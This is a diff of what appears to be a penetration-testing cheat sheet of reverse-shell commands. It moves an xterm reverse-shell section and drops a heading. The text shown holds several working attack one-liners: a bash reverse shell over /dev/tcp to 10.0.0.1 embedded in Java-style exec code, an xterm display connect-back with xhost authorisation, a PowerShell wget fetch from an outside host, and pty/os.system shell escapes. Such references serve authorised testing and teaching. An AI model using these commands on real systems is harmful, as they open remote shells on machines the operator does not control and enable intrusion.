@@ -28,16 +28,6 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
-#### xterm
-One of the simplest forms of reverse shell is an xterm session. The following command should
-be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
-```xterm -display 10.0.0.1:1```
-To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). 
-One way to do this is with Xnest (to be run on your system):
-```Xnest :1```
-You’ll need to authorise the target to connect to you (command also run on your host):
-
-```xhost +targetip```
 
 #### Powershell
 Powershell 2
@@ -50,8 +40,23 @@ Powershell 2
 
 ```Wget http://10.11.0.130/test.txt -o C:\temp\test.txt```
 
+#### xterm
+"One of the simplest forms of reverse shell is an xterm session. 
+The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001:
+
+```xterm -display 10.0.0.1:1```
+
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). 
+
+One way to do this is with Xnest (to be run on your system):
+
+```Xnest :1```
+
+You’ll need to authorise the target to connect to you (command also run on your host):
+
+```xhost +targetip```
+
 #### Shell Escape; from Shellcatraz
-#### Shell Spawning
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
 echo os.system('/bin/bash')
